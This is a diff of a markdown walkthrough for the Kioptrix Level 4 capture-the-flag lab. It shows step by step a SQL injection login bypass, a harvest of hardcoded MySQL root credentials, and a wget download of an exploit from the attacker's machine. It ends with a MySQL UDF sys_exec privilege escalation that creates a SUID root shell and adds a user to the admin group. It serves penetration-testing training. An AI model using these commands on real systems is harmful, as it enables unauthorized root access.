@@ -465,7 +465,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 Using the browser to enumerate webpage and discovering Member Login page.
 
-![](media/dfe598696f03a9721fd72a5842090468.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%204/Images/login.png?raw=true)
 
 Low Privilege Exploitation
 --------------------------
@@ -473,9 +473,9 @@ Low Privilege Exploitation
 ### SQL Injection
 Using usernames discovered with enum4linux, password field can be injected with the following code: ```' or 1='1```
 
-![](media/03af4891d23445482169dfbfc9ba12ef.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%204/Images/sqlinjection.png?raw=true)
 
-![](media/f143065337cf59d6ceda90f0753a0bd8.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%204/Images/sqlinjection1.png?raw=true)
 
 ### SSH
 
@@ -511,193 +511,133 @@ Privilege Escalation Enumeration
 Below service running with root priviliges are displayed.
 
 ```bash
-robert\@Kioptrix4:/\$ ps aux \| grep root \| grep -v ]
-
-root 1 0.0 0.1 2844 1692 ? Ss 19:40 0:02 /sbin/init
-
-root 2875 0.0 0.0 2236 728 ? S\<s 19:41 0:00 /sbin/udevd --daemon
-
-root 4643 0.0 0.0 1716 488 tty4 Ss+ 19:41 0:00 /sbin/getty 38400 tty4
-
-root 4645 0.0 0.0 1716 492 tty5 Ss+ 19:41 0:00 /sbin/getty 38400 tty5
-
-root 4652 0.0 0.0 1716 492 tty2 Ss+ 19:41 0:00 /sbin/getty 38400 tty2
-
-root 4655 0.0 0.0 1716 492 tty3 Ss+ 19:41 0:00 /sbin/getty 38400 tty3
-
-root 4659 0.0 0.0 1716 492 tty6 Ss+ 19:41 0:00 /sbin/getty 38400 tty6
-
-root 4711 0.0 0.0 1872 544 ? S 19:41 0:00 /bin/dd bs 1 if /proc/kmsg of
-/var/run/klogd/kmsg
-
-root 4732 0.0 0.0 5316 992 ? Ss 19:41 0:00 /usr/sbin/sshd
-
-root 4788 0.0 0.0 1772 524 ? S 19:41 0:00 /bin/sh /usr/bin/mysqld_safe
-
-**root 4830 0.0 1.7 127224 17608 ? Sl 19:41 0:04 /usr/sbin/mysqld --basedir=/usr
---datadir=/var/lib/mysql --user=root --pid-file=/var/ru**
-
-root 4832 0.0 0.0 1700 552 ? S 19:41 0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
-
-root 4905 0.0 0.1 6528 1332 ? Ss 19:41 0:00 /usr/sbin/nmbd -D
-
-root 4907 0.0 0.2 10108 2544 ? Ss 19:41 0:00 /usr/sbin/smbd -D
-
-root 4921 0.0 0.0 10108 1028 ? S 19:41 0:00 /usr/sbin/smbd -D
-
-root 4922 0.0 0.1 8084 1340 ? Ss 19:41 0:00 /usr/sbin/winbindd
-
-root 4926 0.0 0.1 8208 1704 ? S 19:41 0:00 /usr/sbin/winbindd
-
-root 4954 0.0 0.0 2104 888 ? Ss 19:41 0:00 /usr/sbin/cron
-
-root 4976 0.0 0.5 20464 6200 ? Ss 19:41 0:00 /usr/sbin/apache2 -k start
-
-root 5031 0.0 0.0 1716 492 tty1 Ss+ 19:41 0:00 /sbin/getty 38400 tty1
-
-root 5050 0.0 0.0 8084 868 ? S 19:47 0:00 /usr/sbin/winbindd
-
-root 5051 0.0 0.1 8092 1264 ? S 19:47 0:00 /usr/sbin/winbindd
-
-robert 8762 0.0 0.0 3004 752 pts/2 R+ 22:21 0:00 grep root
-
+robert@Kioptrix4:/$ ps aux | grep root | grep -v ]
+root         1  0.0  0.1   2844  1692 ?        Ss   19:40   0:02 /sbin/init
+root      2875  0.0  0.0   2236   728 ?        S<s  19:41   0:00 /sbin/udevd --daemon
+root      4643  0.0  0.0   1716   488 tty4     Ss+  19:41   0:00 /sbin/getty 38400 tty4
+root      4645  0.0  0.0   1716   492 tty5     Ss+  19:41   0:00 /sbin/getty 38400 tty5
+root      4652  0.0  0.0   1716   492 tty2     Ss+  19:41   0:00 /sbin/getty 38400 tty2
+root      4655  0.0  0.0   1716   492 tty3     Ss+  19:41   0:00 /sbin/getty 38400 tty3
+root      4659  0.0  0.0   1716   492 tty6     Ss+  19:41   0:00 /sbin/getty 38400 tty6
+root      4711  0.0  0.0   1872   544 ?        S    19:41   0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg
+root      4732  0.0  0.0   5316   992 ?        Ss   19:41   0:00 /usr/sbin/sshd
+root      4788  0.0  0.0   1772   524 ?        S    19:41   0:00 /bin/sh /usr/bin/mysqld_safe
+root      4830  0.0  1.7 127224 17608 ?        Sl   19:41   0:04 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/ru
+root      4832  0.0  0.0   1700   552 ?        S    19:41   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
+root      4905  0.0  0.1   6528  1332 ?        Ss   19:41   0:00 /usr/sbin/nmbd -D
+root      4907  0.0  0.2  10108  2544 ?        Ss   19:41   0:00 /usr/sbin/smbd -D
+root      4921  0.0  0.0  10108  1028 ?        S    19:41   0:00 /usr/sbin/smbd -D
+root      4922  0.0  0.1   8084  1340 ?        Ss   19:41   0:00 /usr/sbin/winbindd
+root      4926  0.0  0.1   8208  1704 ?        S    19:41   0:00 /usr/sbin/winbindd
+root      4954  0.0  0.0   2104   888 ?        Ss   19:41   0:00 /usr/sbin/cron
+root      4976  0.0  0.5  20464  6200 ?        Ss   19:41   0:00 /usr/sbin/apache2 -k start
+root      5031  0.0  0.0   1716   492 tty1     Ss+  19:41   0:00 /sbin/getty 38400 tty1
+root      5050  0.0  0.0   8084   868 ?        S    19:47   0:00 /usr/sbin/winbindd
+root      5051  0.0  0.1   8092  1264 ?        S    19:47   0:00 /usr/sbin/winbindd
+robert    8762  0.0  0.0   3004   752 pts/2    R+   22:21   0:00 grep root
 ```
 
-
+From the above output it was determined that MySQL server is running with administrative privileges.
 
 ### Searching for MySQL password:
 
-obert\@Kioptrix4:/\$ cd /var/www/
+Next we can attempt to gain access to MySQL database by searching for a script containing mysql password. Often these files are located in web directory on the server.
 
-robert\@Kioptrix4:/var/www\$ grep -rl "password" \*
+```bash
+robert@Kioptrix4:/$ cd /var/www/
 
+robert@Kioptrix4:/var/www$ grep -rl "password" *
 checklogin.php
-
 database.sql
-
 index.php
-
 john/john.php
-
 robert/robert.php
 
-robert\@Kioptrix4:/var/www\$ cat checklogin.php
-
-\<?php
-
+robert@Kioptrix4:/var/www$ cat checklogin.php 
+<?php
 ob_start();
+$host="localhost"; // Host name
+$username="root"; // Mysql username
+$password=""; // Mysql password
+$db_name="members"; // Database name
+$tbl_name="members"; // Table name
+```
 
-\$host="localhost"; // Host name
-
-\$username="root"; // Mysql username
-
-\$password=""; // Mysql password
-
-\$db_name="members"; // Database name
-
-\$tbl_name="members"; // Table name
+MySql credentials were found in checklogin.php file located in /var/www directory.
 
 Vulnerability Identification
 ----------------------------
 
 ### Searchsploit
 
-Using searchsploit to looking for appropriate exploit in exploit-db:
-
-root\@kali:/opt/LinEnum\# searchsploit MySQL Privilege Escalation
-
-\---------------------------------------------------------------------------------------------
-----------------------------------------
-
-Exploit Title \| Path
-
-\| (/usr/share/exploitdb/)
-
-\---------------------------------------------------------------------------------------------
-----------------------------------------
-
-MySQL (Linux) - Database Privilege Escalation \| exploits/linux/local/23077.pl
-
-MySQL / MariaDB / PerconaDB 5.5.51/5.6.32/5.7.14 - Code Execution / Privilege
-Escalation \| exploits/linux/local/40360.txt
-
-MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'mysql' System User Privilege
-Escalation / R \| exploits/linux/local/40678.c
-
-MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'root' System User Privilege
-Escalation \| exploits/linux/local/40679.sh
-
-MySQL 3.23.x - 'mysqld' Local Privilege Escalation \|
-exploits/linux/local/22340.txt
-
-MySQL 4.x - CREATE Temporary TABLE Symlink Privilege Escalation \|
-exploits/multiple/remote/25211.c
-
-MySQL User-Defined (Linux) (x32/x86_64) - 'sys_exec' Local Privilege Escalation
-\| exploits/linux/local/46249.py
-
-Oracle MySQL \< 5.1.50 - Privilege Escalation \|
-exploits/multiple/remote/34796.txt
-
-cPanel 10.8.x - 'cpwrap' via MySQLAdmin Privilege Escalation (PHP) \|
-exploits/php/webapps/2554.php
-
-cPanel 10.8.x - cpwrap via MySQLAdmin Privilege Escalation \|
-exploits/linux/local/2466.pl
-
-\---------------------------------------------------------------------------------------------
-----------------------------------------
-
+Using searchsploit to looking for appropriate exploit in exploit-db. It seems like User-Defined Functions is an appropriate vulnerability. 
+```bash
+root@kali:/opt/LinEnum# searchsploit MySQL Privilege Escalation
+--------------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                               |  Path
+                                                                                             | (/usr/share/exploitdb/)
+--------------------------------------------------------------------------------------------- ----------------------------------------
+MySQL (Linux) - Database Privilege Escalation                                                | exploits/linux/local/23077.pl
+MySQL / MariaDB / PerconaDB 5.5.51/5.6.32/5.7.14 - Code Execution / Privilege Escalation     | exploits/linux/local/40360.txt
+MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'mysql' System User Privilege Escalation / R | exploits/linux/local/40678.c
+MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'root' System User Privilege Escalation      | exploits/linux/local/40679.sh
+MySQL 3.23.x - 'mysqld' Local Privilege Escalation                                           | exploits/linux/local/22340.txt
+MySQL 4.x - CREATE Temporary TABLE Symlink Privilege Escalation                              | exploits/multiple/remote/25211.c
+MySQL User-Defined (Linux) (x32/x86_64) - 'sys_exec' Local Privilege Escalation              | exploits/linux/local/46249.py
+Oracle MySQL < 5.1.50 - Privilege Escalation                                                 | exploits/multiple/remote/34796.txt
+cPanel 10.8.x - 'cpwrap' via MySQLAdmin Privilege Escalation (PHP)                           | exploits/php/webapps/2554.php
+cPanel 10.8.x - cpwrap via MySQLAdmin Privilege Escalation                                   | exploits/linux/local/2466.pl
+--------------------------------------------------------------------------------------------- ----------------------------------------
 Shellcodes: No Result
-
 Papers: No Result
+```
 
-root\@kali:\~/vulnhub/kioptrix4\# searchsploit -p 46249
-
-Exploit: MySQL User-Defined (Linux) (x32/x86_64) - 'sys_exec' Local Privilege
-Escalation
-
-URL: https://www.exploit-db.com/exploits/46249
-
-Path: /usr/share/exploitdb/exploits/linux/local/46249.py
-
+Determining path to the exploit and copying it to the clipboard.
+```bash
+root@kali:~/vulnhub/kioptrix4# searchsploit -p 46249
+  Exploit: MySQL User-Defined (Linux) (x32/x86_64) - 'sys_exec' Local Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/46249
+     Path: /usr/share/exploitdb/exploits/linux/local/46249.py
 File Type: ASCII text, with very long lines, with CRLF line terminators
 
-Copied EDB-ID \#46249's path to the clipboard.
+Copied EDB-ID #46249's path to the clipboard.
+```
+
+From the script found above, it seems like the exploit is trying to create a SUID binary:
+
+```python
+os.system('mysql -u root -p\'' + password + '\' -e "select sys_exec(\'cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh\')"')
+```
 
 ### SimpleHTTPServer
 
+Next the exploit needs to be transfered to the vicitms machine.
 Serving exploit using Python’s SimpleHTTP server:
-
-root\@kali:\~/vulnhub/kioptrix4\# python -m SimpleHTTPServer
-
+```bash
+root@kali:~/vulnhub/kioptrix4# python -m SimpleHTTPServer 
 Serving HTTP on 0.0.0.0 port 8000 ...
-
 192.168.211.129 - - [04/Sep/2019 13:08:28] "GET /46249.py HTTP/1.0" 200 –
+```
 
 Downloading the exploit to victim’s machine:
-
-robert\@Kioptrix4:/tmp\$ wget 192.168.211.130:8000/46249.py
-
-\--22:30:57-- http://192.168.211.130:8000/46249.py
-
-=\> \`46249.py'
-
+```bash
+robert@Kioptrix4:/tmp$ wget 192.168.211.130:8000/46249.py
+--22:30:57--  http://192.168.211.130:8000/46249.py
+           => `46249.py'
 Connecting to 192.168.211.130:8000... connected.
-
 HTTP request sent, awaiting response... 200 OK
-
 Length: 31,215 (30K) [text/plain]
 
-100%[==========================\>] 31,215 --.--K/s
+100%[==========================>] 31,215        --.--K/s             
 
-22:30:57 (146.56 MB/s) - \`46249.py' saved [31215/31215]
+22:30:57 (146.56 MB/s) - `46249.py' saved [31215/31215]
+```
 
 Privilege Escalation
 --------------------
 
-Running the exploit:
-
+Running the exploit.
+```bash
 robert\@Kioptrix4:/tmp\$ python 46249.py
 
 Traceback (most recent call last):
@@ -707,6 +647,7 @@ File "46249.py", line 35, in \<module\>
 import argparse
 
 ImportError: No module named argparse
+```
 
 Above python script did not work due to argparse module not being present on the
 system, next a manual attempt will be performed.
@@ -717,86 +658,93 @@ lib_mysqludf_sys needs to be present in order to exploit the vulnerability:
 <https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html>
 
 Searching for the library:
-
-robert\@Kioptrix4:/tmp\$ find / -name lib_mysqludf_sys\* 2\>/dev/null
-
+```bash
+robert@Kioptrix4:/tmp$ find / -name lib_mysqludf_sys* 2>/dev/null
 /usr/lib/lib_mysqludf_sys.so
+```
 
 After searching for the library, it is confirmed that it's present on the
 system.
 
 Next, MySQL authentication should be performed:
 
-robert\@Kioptrix4:/tmp\$ mysql -u root
-
-Welcome to the MySQL monitor. Commands end with ; or \\g.
-
+```bash
+robert@Kioptrix4:/tmp$ mysql -u root
+Welcome to the MySQL monitor.  Commands end with ; or \g.
 Your MySQL connection id is 17267
-
 Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)
 
-Type 'help;' or '\\h' for help. Type '\\c' to clear the buffer.
+Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
+```
 
-Once MySQL authentication is performed, the privilege escalation command can be
-executed:
+Privilege Escalation can be done in several ways.
 
-mysql\> select sys_exec('usermod -a -G admin robert');
+As per the python script above, once MySQL authentication is performed, the same command can be executed manually in MySQL. As can be seen below the SUID binary was created and when executed access to root account has been granted.
 
-\+----------------------------------------+
+```bash
+mysql> select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
+    -> ;
++-------------------------------------------------------------------------+
+| sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh') |
++-------------------------------------------------------------------------+
+| NULL                                                                    | 
++-------------------------------------------------------------------------+
+1 row in set (0.01 sec)
 
-\| sys_exec('usermod -a -G admin robert') \|
-
-\+----------------------------------------+
-
-\| NULL \|
-
-\+----------------------------------------+
-
-1 row in set (0.04 sec)
-
-mysql\> exit
-
+mysql> exit
 Bye
+robert@Kioptrix4:~$ cd /tmp/
+robert@Kioptrix4:/tmp$ ls
+46249.py  LinEnum.sh  sh
+robert@Kioptrix4:/tmp$ ./sh
+# whoami
+root
+```
 
-User Robert has now been added to administrative group. Now we can switch to
+Second way is to add the user (robert) to administrative group.
+
+```bash
+mysql> select sys_exec('usermod -a -G admin robert');
++----------------------------------------+
+| sys_exec('usermod -a -G admin robert') |
++----------------------------------------+
+| NULL                                   | 
++----------------------------------------+
+1 row in set (0.04 sec)
+mysql> exit
+Bye
+```
+
+User Robert has now been added to administrative group. Now the switch can be made to
 root user from Robert’s account as shown below:
 
-robert\@Kioptrix4:/tmp\$ sudo su
-
-[sudo] password for robert:
-
-root\@Kioptrix4:/tmp\# whoami
-
+```bash
+robert@Kioptrix4:/tmp$ sudo su
+[sudo] password for robert: 
+root@Kioptrix4:/tmp# whoami
 root
+```
 
 Lastly, the root flag has been obtained:
 
-root\@Kioptrix4:/tmp\# cd /root
-
-root\@Kioptrix4:\~\# cat congrats.txt
-
+```bash
+root@Kioptrix4:/tmp# cd /root
+root@Kioptrix4:~# cat congrats.txt 
 Congratulations!
-
 You've got root.
 
 There is more then one way to get root on this system. Try and find them.
-
 I've only tested two (2) methods, but it doesn't mean there aren't more.
-
 As always there's an easy way, and a not so easy way to pop this box.
-
 Look for other methods to get root privileges other than running an exploit.
 
 It took a while to make this. For one it's not as easy as it may look, and
-
 also work and family life are my priorities. Hobbies are low on my list.
-
 Really hope you enjoyed this one.
 
 If you haven't already, check out the other VMs available on:
-
 www.kioptrix.com
 
 Thanks for playing,
-
 loneferret
+```
